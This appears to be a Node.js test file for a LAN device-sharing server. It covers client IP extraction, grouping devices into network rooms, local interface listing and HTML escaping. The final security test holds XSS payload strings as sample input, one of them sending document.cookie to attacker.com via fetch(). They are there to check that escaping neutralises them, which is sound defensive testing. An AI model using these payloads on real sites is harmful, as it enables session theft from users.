const test = require('node:test');
const assert = require('node:assert/strict');
const { getDeviceIP, getRoomId, getLocalIPs, rooms } = require('../js/server.js');

test('getDeviceIP - should extract correct IP from various socket headers', () => {
    // 1. Direct local IP
    const socket1 = {
        handshake: {
            headers: {},
            address: '192.168.1.50'
        }
    };
    assert.equal(getDeviceIP(socket1), '192.168.1.50');

    // 2. IPv6 loopback
    const socket2 = {
        handshake: {
            headers: {},
            address: '::1'
        }
    };
    assert.equal(getDeviceIP(socket2), '127.0.0.1');

    // 3. IPv4-mapped IPv6
    const socket3 = {
        handshake: {
            headers: {},
            address: '::ffff:192.168.1.15'
        }
    };
    assert.equal(getDeviceIP(socket3), '192.168.1.15');

    // 4. Proxied IP with multiple hops
    const socket4 = {
        handshake: {
            headers: {
                'x-forwarded-for': '203.0.113.195, 70.41.3.18, 150.172.238.178'
            },
            address: '127.0.0.1'
        }
    };
    assert.equal(getDeviceIP(socket4), '203.0.113.195');

    // 5. Corrupted / missing input fallback
    const socket5 = {
        handshake: {
            headers: {},
            address: null
        }
    };
    assert.equal(getDeviceIP(socket5), '127.0.0.1');
});

test('getRoomId - should correctly partition LAN vs IPv6 vs Public networks', () => {
    // Localhost & LAN
    assert.equal(getRoomId('127.0.0.1'), 'LAN-Network');
    assert.equal(getRoomId('192.168.1.1'), 'LAN-Network');
    assert.equal(getRoomId('192.168.100.254'), 'LAN-Network');
    assert.equal(getRoomId('10.0.0.1'), 'LAN-Network');
    assert.equal(getRoomId('10.254.0.1'), 'LAN-Network');
    assert.equal(getRoomId('172.16.0.1'), 'LAN-Network');
    assert.equal(getRoomId('172.25.10.5'), 'LAN-Network');
    assert.equal(getRoomId('172.31.255.254'), 'LAN-Network');

    // Not LAN (e.g. 172.32 is public)
    assert.notEqual(getRoomId('172.32.0.1'), 'LAN-Network');
    assert.equal(getRoomId('172.32.0.1'), '172.32.0.1');

    // Public IPv4
    assert.equal(getRoomId('113.161.45.22'), '113.161.45.22');

    // IPv6 /64 prefix grouping
    const ipv6Device1 = '2402:800:61c2:887b:c0de:1234:5678:9abc';
    const ipv6Device2 = '2402:800:61c2:887b:aaaa:bbbb:cccc:dddd';
    const room1 = getRoomId(ipv6Device1);
    const room2 = getRoomId(ipv6Device2);

    assert.equal(room1, 'IPv6-Network-2402:800:61c2:887b');
    assert.equal(room1, room2, 'Hai thiết bị trong cùng dải IPv6 /64 phải chung phòng');

    // Invalid input fallback
    assert.equal(getRoomId(null), 'LAN-Network');
    assert.equal(getRoomId(undefined), 'LAN-Network');
});

test('getLocalIPs - should enumerate available IPv4 addresses', () => {
    const ips = getLocalIPs();
    assert.ok(Array.isArray(ips));
    ips.forEach(item => {
        assert.ok(item.name, 'Phải có tên network interface');
        assert.ok(item.address, 'Phải có địa chỉ IP');
        assert.notEqual(item.address, '127.0.0.1', 'Không được chứa loopback internal');
    });
});

test('Security check - HTML Sanitization against XSS vectors', () => {
    function escapeHtml(str) {
        if (str === null || str === undefined) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }

    const dangerousXss1 = '<script>alert("XSS")</script>';
    const dangerousXss2 = '<img src=x onerror="fetch(\'http://attacker.com?cookie=\'+document.cookie)">';
    const dangerousXss3 = '"><svg/onload=alert(1)>';

    assert.ok(!escapeHtml(dangerousXss1).includes('<script>'));
    assert.ok(!escapeHtml(dangerousXss2).includes('<img'));
    assert.ok(!escapeHtml(dangerousXss3).includes('<svg'));
    assert.equal(escapeHtml(dangerousXss1), '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
});

test('Call & Room state integrity', () => {
    assert.ok(rooms !== undefined, 'Đối tượng rooms phải tồn tại');
    assert.equal(typeof rooms, 'object');
});
